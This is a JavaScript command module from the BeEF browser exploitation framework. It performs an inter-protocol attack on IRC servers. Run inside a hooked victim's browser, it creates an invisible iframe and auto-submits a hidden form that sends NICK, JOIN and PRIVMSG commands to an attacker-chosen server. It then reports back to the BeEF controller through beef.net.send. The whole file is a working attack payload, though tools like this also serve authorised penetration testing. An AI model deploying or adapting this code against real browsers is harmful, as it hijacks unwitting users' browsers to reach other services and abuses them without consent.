//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/**
 * Inter protocol IRC module
 * Developed by jgaliana
 *
 * It is known that some IRC servers have protections against browser's connections in order to prevent attacks seen in the wild
 * http://www.theregister.co.uk/2010/01/30/firefox_interprotocol_attack/
 */
beef.execute(function() {

	var server = '<%= @server %>';
	var port = '<%= @port %>';
	var nick = '<%= @nick %>';
	var channel = '<%= @channel %>';
	var message = '<%= @message %>';

	var target = "http://" + server + ":" + port;
	var irc_commands= "NICK " + nick + "\n";
	irc_commands+= "USER " + nick + " 8 * : " + nick + " user\n";
	irc_commands+= "JOIN " + channel + "\n";
	irc_commands+= "PRIVMSG " + channel + " :" + message + "\n";

	var iframe = beef.dom.createInvisibleIframe();

	var form = document.createElement('form');
	form.setAttribute('action', target);
	form.setAttribute('method', 'post');
	form.setAttribute('enctype', 'multipart/form-data');

	var input = document.createElement('input');
	input.setAttribute('type', 'hidden');
	input.setAttribute('name', 'data');
	input.setAttribute('value', irc_commands);
	form.appendChild(input);

	iframe.contentWindow.document.body.appendChild(form);
	form.submit();

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IRC command sent");

});
